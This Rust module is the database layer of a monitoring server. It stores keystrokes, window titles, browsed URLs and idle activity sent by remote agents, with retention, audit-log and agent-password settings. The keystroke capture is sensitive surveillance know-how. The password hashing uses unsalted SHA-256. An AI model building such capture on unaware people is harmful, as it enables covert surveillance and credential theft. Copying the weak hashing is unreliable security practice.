//! Database operations.
//!
//! All queries use the non-macro `sqlx::query()` / `sqlx::query_scalar()` API
//! so the server compiles without a running database (no `SQLX_OFFLINE` flag
//! needed in CI or Docker builds).

use anyhow::Result;
use chrono::{DateTime, TimeZone, Utc};
use serde::Serialize;
use sha2::{Digest, Sha256};
use sqlx::{PgPool, Row};
use uuid::Uuid;

// ─── Retention policy ─────────────────────────────────────────────────────────

/// Global retention: `None` / NULL = keep forever (no automatic deletion).
#[derive(Debug, Clone, Serialize)]
pub struct RetentionPolicy {
    pub keylog_days: Option<i32>,
    pub window_days: Option<i32>,
    pub url_days: Option<i32>,
}

/// Per-agent override. Each `None` means “use global default for that category”.
#[derive(Debug, Clone, Serialize)]
pub struct RetentionAgentOverride {
    pub keylog_days: Option<i32>,
    pub window_days: Option<i32>,
    pub url_days: Option<i32>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AuditRecord {
    pub id: i64,
    pub ts: DateTime<Utc>,
    pub actor: String,
    pub agent_id: Option<Uuid>,
    pub action: String,
    pub status: String,
    pub detail: serde_json::Value,
}

// ─── Agents ───────────────────────────────────────────────────────────────────

/// Insert the agent if it doesn't exist yet; always bump `last_seen`.
/// Returns the stable UUID for this agent name.
pub async fn upsert_agent(pool: &PgPool, name: &str) -> Result<Uuid> {
    let row = sqlx::query(
        r#"
        INSERT INTO agents (name)
        VALUES ($1)
        ON CONFLICT (name) DO UPDATE SET last_seen = NOW()
        RETURNING id
        "#,
    )
    .bind(name)
    .fetch_one(pool)
    .await?;

    Ok(row.try_get("id")?)
}

/// Update `last_seen` when the agent disconnects.
pub async fn touch_agent(pool: &PgPool, id: Uuid) -> Result<()> {
    sqlx::query("UPDATE agents SET last_seen = NOW() WHERE id = $1")
        .bind(id)
        .execute(pool)
        .await?;
    Ok(())
}

/// Upsert the latest system/specs snapshot for an agent.
pub async fn upsert_agent_info(pool: &PgPool, agent_id: Uuid, info: &serde_json::Value) -> Result<()> {
    sqlx::query(
        r#"
        INSERT INTO agent_info (agent_id, info, updated_at)
        VALUES ($1, $2, NOW())
        ON CONFLICT (agent_id)
        DO UPDATE SET info = EXCLUDED.info, updated_at = NOW()
        "#,
    )
    .bind(agent_id)
    .bind(info)
    .execute(pool)
    .await?;
    Ok(())
}

/// Fetch the latest stored system/specs snapshot for an agent (if any).
pub async fn get_agent_info(pool: &PgPool, agent_id: Uuid) -> Result<Option<serde_json::Value>> {
    let row = sqlx::query("SELECT info FROM agent_info WHERE agent_id = $1")
        .bind(agent_id)
        .fetch_optional(pool)
        .await?;

    Ok(row.and_then(|r| r.try_get::<serde_json::Value, _>("info").ok()))
}

// ─── Agent sessions (connection history) ──────────────────────────────────────

/// Record a new WebSocket session for an agent. Returns the session row id.
pub async fn start_agent_session(pool: &PgPool, agent_id: Uuid) -> Result<i64> {
    let id: i64 =
        sqlx::query_scalar(r#"INSERT INTO agent_sessions (agent_id) VALUES ($1) RETURNING id"#)
            .bind(agent_id)
            .fetch_one(pool)
            .await?;
    Ok(id)
}

/// Mark an agent session disconnected.
pub async fn end_agent_session(pool: &PgPool, session_id: i64) -> Result<()> {
    sqlx::query("UPDATE agent_sessions SET disconnected_at = NOW() WHERE id = $1")
        .bind(session_id)
        .execute(pool)
        .await?;
    Ok(())
}

/// Returns (last_connected_at, last_disconnected_at) for an agent.
pub async fn agent_last_session_times(
    pool: &PgPool,
    agent_id: Uuid,
) -> Result<(Option<DateTime<Utc>>, Option<DateTime<Utc>>)> {
    let row = sqlx::query(
        r#"
        SELECT
            MAX(connected_at)    AS last_connected_at,
            MAX(disconnected_at) AS last_disconnected_at
        FROM agent_sessions
        WHERE agent_id = $1
        "#,
    )
    .bind(agent_id)
    .fetch_one(pool)
    .await?;

    let last_connected_at: Option<DateTime<Utc>> = row.try_get("last_connected_at").ok();
    let last_disconnected_at: Option<DateTime<Utc>> = row.try_get("last_disconnected_at").ok();
    Ok((last_connected_at, last_disconnected_at))
}

// ─── Window events ────────────────────────────────────────────────────────────

pub async fn insert_window(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let title = v["title"].as_str().unwrap_or("");
    let app = v["app"].as_str().unwrap_or("");
    let hwnd = v["hwnd"].as_i64().unwrap_or(0);
    let ts = unix_to_dt(v["ts"].as_i64());

    sqlx::query(
        "INSERT INTO window_events (agent_id, title, app, hwnd, ts) VALUES ($1,$2,$3,$4,$5)",
    )
    .bind(agent)
    .bind(title)
    .bind(app)
    .bind(hwnd)
    .bind(ts)
    .execute(pool)
    .await?;

    Ok(())
}

// ─── Key sessions ─────────────────────────────────────────────────────────────

/// Append text to an open session (same agent/app/window, updated ≤ 30 s ago).
/// Creates a new session row if no open one exists.
pub async fn upsert_keys(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let app = v["app"].as_str().unwrap_or("");
    let window = v["window"].as_str().unwrap_or("");
    let text = v["text"].as_str().unwrap_or("");
    let ts = unix_to_dt(v["ts"].as_i64());

    let updated = sqlx::query(
        r#"
        UPDATE key_sessions
        SET    text         = text || $1,
               updated_at   = NOW()
        WHERE  agent_id     = $2
          AND  app          = $3
          AND  window_title = $4
          AND  updated_at   > NOW() - INTERVAL '30 seconds'
        "#,
    )
    .bind(text)
    .bind(agent)
    .bind(app)
    .bind(window)
    .execute(pool)
    .await?;

    if updated.rows_affected() == 0 {
        sqlx::query(
            "INSERT INTO key_sessions (agent_id, app, window_title, text, started_at, updated_at) \
             VALUES ($1,$2,$3,$4,$5,NOW())",
        )
        .bind(agent)
        .bind(app)
        .bind(window)
        .bind(text)
        .bind(ts)
        .execute(pool)
        .await?;
    }

    Ok(())
}

// ─── URL visits ───────────────────────────────────────────────────────────────

/// Insert a URL visit, skipping exact consecutive duplicates for this agent.
pub async fn insert_url(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let url = v["url"].as_str().unwrap_or("");
    let title = v["title"].as_str();
    let browser = v["browser"].as_str();
    let ts = unix_to_dt(v["ts"].as_i64());

    // Skip if same URL as the most-recent visit for this agent.
    let last: Option<String> = sqlx::query_scalar(
        "SELECT url FROM url_visits WHERE agent_id = $1 ORDER BY ts DESC LIMIT 1",
    )
    .bind(agent)
    .fetch_optional(pool)
    .await?;

    if last.as_deref() == Some(url) {
        return Ok(());
    }

    sqlx::query(
        "INSERT INTO url_visits (agent_id, url, title, browser, ts) VALUES ($1,$2,$3,$4,$5)",
    )
    .bind(agent)
    .bind(url)
    .bind(title)
    .bind(browser)
    .bind(ts)
    .execute(pool)
    .await?;

    Ok(())
}

// ─── Activity log ─────────────────────────────────────────────────────────────

pub async fn insert_activity(pool: &PgPool, agent: Uuid, v: &serde_json::Value) -> Result<()> {
    let kind = v["type"].as_str().unwrap_or("");
    let idle_secs = v["idle_secs"].as_i64();
    let ts = unix_to_dt(v["ts"].as_i64());

    sqlx::query(
        "INSERT INTO activity_log (agent_id, event_type, idle_secs, ts) VALUES ($1,$2,$3,$4)",
    )
    .bind(agent)
    .bind(kind)
    .bind(idle_secs)
    .bind(ts)
    .execute(pool)
    .await?;

    Ok(())
}

// ─── List / query helpers (used by API) ───────────────────────────────────────

pub async fn list_agents(pool: &PgPool) -> Result<Vec<serde_json::Value>> {
    let rows =
        sqlx::query("SELECT id, name, first_seen, last_seen FROM agents ORDER BY last_seen DESC")
            .fetch_all(pool)
            .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let id: Uuid = r.try_get("id").unwrap_or_default();
            let name: String = r.try_get("name").unwrap_or_default();
            let first: DateTime<Utc> = r.try_get("first_seen").unwrap_or_else(|_| Utc::now());
            let last: DateTime<Utc> = r.try_get("last_seen").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "id": id, "name": name, "first_seen": first, "last_seen": last })
        })
        .collect())
}

pub async fn insert_audit_log(
    pool: &PgPool,
    actor: &str,
    agent_id: Option<Uuid>,
    action: &str,
    status: &str,
    detail: &serde_json::Value,
) -> Result<()> {
    sqlx::query(
        "INSERT INTO audit_log (actor, agent_id, action, status, detail) VALUES ($1, $2, $3, $4, $5)",
    )
    .bind(actor)
    .bind(agent_id)
    .bind(action)
    .bind(status)
    .bind(detail)
    .execute(pool)
    .await?;

    Ok(())
}

/// Insert an audit row unless an identical recent row already exists.
///
/// "Identical" means same actor/agent/action/status/detail JSON and within
/// `dedup_window_secs` from now.
pub async fn insert_audit_log_dedup(
    pool: &PgPool,
    actor: &str,
    agent_id: Option<Uuid>,
    action: &str,
    status: &str,
    detail: &serde_json::Value,
    dedup_window_secs: i64,
) -> Result<()> {
    let exists: Option<i64> = sqlx::query_scalar(
        r#"
        SELECT id
        FROM audit_log
        WHERE actor = $1
          AND (($2::uuid IS NULL AND agent_id IS NULL) OR agent_id = $2)
          AND action = $3
          AND status = $4
          AND detail = $5::jsonb
          AND ts > NOW() - ($6::bigint * INTERVAL '1 second')
        ORDER BY ts DESC
        LIMIT 1
        "#,
    )
    .bind(actor)
    .bind(agent_id)
    .bind(action)
    .bind(status)
    .bind(detail)
    .bind(dedup_window_secs)
    .fetch_optional(pool)
    .await?;

    if exists.is_none() {
        insert_audit_log(pool, actor, agent_id, action, status, detail).await?;
    }

    Ok(())
}

pub async fn query_audit_log(
    pool: &PgPool,
    agent_id: Option<Uuid>,
    action: Option<&str>,
    status: Option<&str>,
    limit: i64,
    offset: i64,
) -> Result<Vec<AuditRecord>> {
    let rows = sqlx::query(
        r#"
        SELECT id, ts, actor, agent_id, action, status, detail
        FROM audit_log
        WHERE ($1::uuid IS NULL OR agent_id = $1)
          AND ($2::text IS NULL OR action = $2)
          AND ($3::text IS NULL OR status = $3)
        ORDER BY ts DESC
        LIMIT $4 OFFSET $5
        "#,
    )
    .bind(agent_id)
    .bind(action)
    .bind(status)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| AuditRecord {
            id: r.try_get("id").unwrap_or_default(),
            ts: r.try_get("ts").unwrap_or_else(|_| Utc::now()),
            actor: r.try_get("actor").unwrap_or_else(|_| "dashboard".to_string()),
            agent_id: r.try_get("agent_id").ok(),
            action: r.try_get("action").unwrap_or_default(),
            status: r.try_get("status").unwrap_or_else(|_| "ok".to_string()),
            detail: r
                .try_get("detail")
                .unwrap_or_else(|_| serde_json::json!({})),
        })
        .collect())
}

pub async fn query_windows(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT title, app, hwnd, ts \
         FROM window_events WHERE agent_id=$1 ORDER BY ts DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let title: String = r.try_get("title").unwrap_or_default();
            let app: String = r.try_get("app").unwrap_or_default();
            let hwnd: i64 = r.try_get("hwnd").unwrap_or_default();
            let ts: DateTime<Utc> = r.try_get("ts").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "title": title, "app": app, "hwnd": hwnd, "ts": ts })
        })
        .collect())
}

pub async fn query_keys(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT app, window_title, text, started_at, updated_at \
         FROM key_sessions WHERE agent_id=$1 ORDER BY updated_at DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let app: String = r.try_get("app").unwrap_or_default();
            let window: String = r.try_get("window_title").unwrap_or_default();
            let text: String = r.try_get("text").unwrap_or_default();
            let started_at: DateTime<Utc> = r.try_get("started_at").unwrap_or_else(|_| Utc::now());
            let updated_at: DateTime<Utc> = r.try_get("updated_at").unwrap_or_else(|_| Utc::now());
            serde_json::json!({
                "app": app, "window_title": window, "text": text,
                "started_at": started_at, "updated_at": updated_at
            })
        })
        .collect())
}

pub async fn query_urls(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT url, title, browser, ts \
         FROM url_visits WHERE agent_id=$1 ORDER BY ts DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let url: String = r.try_get("url").unwrap_or_default();
            let title: Option<String> = r.try_get("title").ok().flatten();
            let browser: Option<String> = r.try_get("browser").ok().flatten();
            let ts: DateTime<Utc> = r.try_get("ts").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "url": url, "title": title, "browser": browser, "ts": ts })
        })
        .collect())
}

pub async fn query_activity(
    pool: &PgPool,
    agent: Uuid,
    limit: i64,
    offset: i64,
) -> Result<Vec<serde_json::Value>> {
    let rows = sqlx::query(
        "SELECT event_type, idle_secs, ts \
         FROM activity_log WHERE agent_id=$1 ORDER BY ts DESC LIMIT $2 OFFSET $3",
    )
    .bind(agent)
    .bind(limit)
    .bind(offset)
    .fetch_all(pool)
    .await?;

    Ok(rows
        .iter()
        .map(|r| {
            let event_type: String = r.try_get("event_type").unwrap_or_default();
            let idle_secs: Option<i64> = r.try_get("idle_secs").ok().flatten();
            let ts: DateTime<Utc> = r.try_get("ts").unwrap_or_else(|_| Utc::now());
            serde_json::json!({ "event_type": event_type, "idle_secs": idle_secs, "ts": ts })
        })
        .collect())
}

/// Clear all telemetry history for an agent while keeping the `agents` row.
///
/// This is used by the dashboard "clear history" UX so operators can
/// selectively wipe what they previously recorded for a single client.
pub async fn clear_agent_history(pool: &PgPool, agent: Uuid) -> Result<u64> {
    // Note: we intentionally do NOT delete from `agents` (the sidebar needs it).
    // Deleting telemetry rows keeps foreign keys simple (each table already
    // references `agents(id)` with ON DELETE CASCADE).
    let win = sqlx::query("DELETE FROM window_events WHERE agent_id = $1")
        .bind(agent)
        .execute(pool)
        .await?
        .rows_affected();

    let keys = sqlx::query("DELETE FROM key_sessions WHERE agent_id = $1")
        .bind(agent)
        .execute(pool)
        .await?
        .rows_affected();

    let urls = sqlx::query("DELETE FROM url_visits WHERE agent_id = $1")
        .bind(agent)
        .execute(pool)
        .await?
        .rows_affected();

    let activity = sqlx::query("DELETE FROM activity_log WHERE agent_id = $1")
        .bind(agent)
        .execute(pool)
        .await?
        .rows_affected();

    // Also clear websocket connection history so "last seen" becomes empty.
    // If you prefer to keep last-seen timestamps, remove this query.
    let sessions = sqlx::query("DELETE FROM agent_sessions WHERE agent_id = $1")
        .bind(agent)
        .execute(pool)
        .await?
        .rows_affected();

    Ok(win.saturating_add(keys).saturating_add(urls).saturating_add(activity).saturating_add(sessions))
}

// ─── Retention settings & pruning ─────────────────────────────────────────────

pub async fn get_retention_global(pool: &PgPool) -> Result<RetentionPolicy> {
    let row = sqlx::query(
        "SELECT keylog_days, window_days, url_days FROM retention_global WHERE id = 1",
    )
    .fetch_one(pool)
    .await?;

    Ok(RetentionPolicy {
        keylog_days: row.try_get::<Option<i32>, _>("keylog_days").unwrap_or(None),
        window_days: row.try_get::<Option<i32>, _>("window_days").unwrap_or(None),
        url_days: row.try_get::<Option<i32>, _>("url_days").unwrap_or(None),
    })
}

pub async fn set_retention_global(pool: &PgPool, p: &RetentionPolicy) -> Result<()> {
    sqlx::query(
        "UPDATE retention_global SET keylog_days = $1, window_days = $2, url_days = $3 WHERE id = 1",
    )
    .bind(p.keylog_days)
    .bind(p.window_days)
    .bind(p.url_days)
    .execute(pool)
    .await?;
    Ok(())
}

pub async fn get_retention_agent(pool: &PgPool, agent: Uuid) -> Result<Option<RetentionAgentOverride>> {
    let row = sqlx::query(
        "SELECT keylog_days, window_days, url_days FROM retention_agent WHERE agent_id = $1",
    )
    .bind(agent)
    .fetch_optional(pool)
    .await?;

    Ok(row.map(|r| RetentionAgentOverride {
        keylog_days: r.try_get::<Option<i32>, _>("keylog_days").unwrap_or(None),
        window_days: r.try_get::<Option<i32>, _>("window_days").unwrap_or(None),
        url_days: r.try_get::<Option<i32>, _>("url_days").unwrap_or(None),
    }))
}

pub async fn set_retention_agent(pool: &PgPool, agent: Uuid, p: &RetentionAgentOverride) -> Result<()> {
    let all_inherit = p.keylog_days.is_none() && p.window_days.is_none() && p.url_days.is_none();
    if all_inherit {
        sqlx::query("DELETE FROM retention_agent WHERE agent_id = $1")
            .bind(agent)
            .execute(pool)
            .await?;
        return Ok(());
    }

    sqlx::query(
        r#"
        INSERT INTO retention_agent (agent_id, keylog_days, window_days, url_days)
        VALUES ($1, $2, $3, $4)
        ON CONFLICT (agent_id) DO UPDATE SET
            keylog_days = EXCLUDED.keylog_days,
            window_days = EXCLUDED.window_days,
            url_days = EXCLUDED.url_days
        "#,
    )
    .bind(agent)
    .bind(p.keylog_days)
    .bind(p.window_days)
    .bind(p.url_days)
    .execute(pool)
    .await?;
    Ok(())
}

pub async fn clear_retention_agent(pool: &PgPool, agent: Uuid) -> Result<()> {
    sqlx::query("DELETE FROM retention_agent WHERE agent_id = $1")
        .bind(agent)
        .execute(pool)
        .await?;
    Ok(())
}

/// Delete telemetry older than the effective retention for each agent.
/// Activity (AFK) rows use the same cutoff as window history.
pub async fn prune_telemetry_by_retention(pool: &PgPool) -> Result<()> {
    let global = get_retention_global(pool).await?;

    let agent_ids: Vec<Uuid> =
        sqlx::query_scalar("SELECT id FROM agents").fetch_all(pool).await?;

    for aid in agent_ids {
        let ov = get_retention_agent(pool, aid).await?.unwrap_or(RetentionAgentOverride {
            keylog_days: None,
            window_days: None,
            url_days: None,
        });

        let key_d = ov.keylog_days.or(global.keylog_days);
        let win_d = ov.window_days.or(global.window_days);
        let url_d = ov.url_days.or(global.url_days);

        if let Some(days) = key_d {
            sqlx::query(
                "DELETE FROM key_sessions WHERE agent_id = $1 AND updated_at < NOW() - ($2::bigint * INTERVAL '1 day')",
            )
            .bind(aid)
            .bind(days as i64)
            .execute(pool)
            .await?;
        }

        if let Some(days) = win_d {
            sqlx::query(
                "DELETE FROM window_events WHERE agent_id = $1 AND ts < NOW() - ($2::bigint * INTERVAL '1 day')",
            )
            .bind(aid)
            .bind(days as i64)
            .execute(pool)
            .await?;

            sqlx::query(
                "DELETE FROM activity_log WHERE agent_id = $1 AND ts < NOW() - ($2::bigint * INTERVAL '1 day')",
            )
            .bind(aid)
            .bind(days as i64)
            .execute(pool)
            .await?;
        }

        if let Some(days) = url_d {
            sqlx::query(
                "DELETE FROM url_visits WHERE agent_id = $1 AND ts < NOW() - ($2::bigint * INTERVAL '1 day')",
            )
            .bind(aid)
            .bind(days as i64)
            .execute(pool)
            .await?;
        }
    }

    Ok(())
}

// ─── Agent local UI password (SHA-256 hex, matches Windows agent config.rs) ───

/// SHA-256 hex digest — same algorithm as the agent `hash_password()`.
pub fn sha256_hex(plain: &str) -> String {
    let mut h = Sha256::new();
    h.update(plain.as_bytes());
    format!("{:x}", h.finalize())
}

/// Hash for an empty password (no lock).
pub fn empty_agent_ui_password_hash() -> String {
    sha256_hex("")
}

/// `true` if this hash means the user must type a non-empty password to open settings.
pub fn agent_ui_password_is_set(hash: Option<&str>) -> bool {
    match hash {
        None => false,
        Some(h) if h.is_empty() => false,
        Some(h) => h != empty_agent_ui_password_hash().as_str(),
    }
}

pub async fn get_local_ui_global_hash(pool: &PgPool) -> Result<Option<String>> {
    let v: Option<String> = sqlx::query_scalar(
        "SELECT password_hash_sha256 FROM agent_local_ui_password WHERE id = 1",
    )
    .fetch_one(pool)
    .await?;
    Ok(v)
}

pub async fn set_local_ui_global_hash(pool: &PgPool, hash: Option<&str>) -> Result<()> {
    sqlx::query(
        "UPDATE agent_local_ui_password SET password_hash_sha256 = $1 WHERE id = 1",
    )
    .bind(hash)
    .execute(pool)
    .await?;
    Ok(())
}

pub async fn get_local_ui_override_hash(pool: &PgPool, agent_id: Uuid) -> Result<Option<String>> {
    let v: Option<Option<String>> = sqlx::query_scalar(
        "SELECT password_hash_sha256 FROM agent_local_ui_password_override WHERE agent_id = $1",
    )
    .bind(agent_id)
    .fetch_optional(pool)
    .await?;

    Ok(v.flatten())
}

pub async fn set_local_ui_override_hash(pool: &PgPool, agent_id: Uuid, hash: Option<&str>) -> Result<()> {
    match hash {
        None => {
            sqlx::query("DELETE FROM agent_local_ui_password_override WHERE agent_id = $1")
                .bind(agent_id)
                .execute(pool)
                .await?;
        }
        Some(h) => {
            sqlx::query(
                r#"
                INSERT INTO agent_local_ui_password_override (agent_id, password_hash_sha256)
                VALUES ($1, $2)
                ON CONFLICT (agent_id) DO UPDATE SET
                    password_hash_sha256 = EXCLUDED.password_hash_sha256
                "#,
            )
            .bind(agent_id)
            .bind(h)
            .execute(pool)
            .await?;
        }
    }
    Ok(())
}

pub async fn clear_local_ui_override(pool: &PgPool, agent_id: Uuid) -> Result<()> {
    sqlx::query("DELETE FROM agent_local_ui_password_override WHERE agent_id = $1")
        .bind(agent_id)
        .execute(pool)
        .await?;
    Ok(())
}

/// Effective hash pushed to the agent (override wins when set).
pub async fn effective_agent_ui_password_hash(pool: &PgPool, agent_id: Uuid) -> Result<String> {
    let global: Option<String> = sqlx::query_scalar(
        "SELECT password_hash_sha256 FROM agent_local_ui_password WHERE id = 1",
    )
    .fetch_one(pool)
    .await?;

    let global_hex = match global {
        Some(h) if !h.is_empty() => h,
        _ => empty_agent_ui_password_hash(),
    };

    let ov = get_local_ui_override_hash(pool, agent_id).await?;
    if let Some(h) = ov {
        if !h.is_empty() {
            return Ok(h);
        }
    }
    Ok(global_hex)
}

// ─── Utility ──────────────────────────────────────────────────────────────────

fn unix_to_dt(ts: Option<i64>) -> DateTime<Utc> {
    ts.and_then(|s| Utc.timestamp_opt(s, 0).single())
        .unwrap_or_else(Utc::now)
}
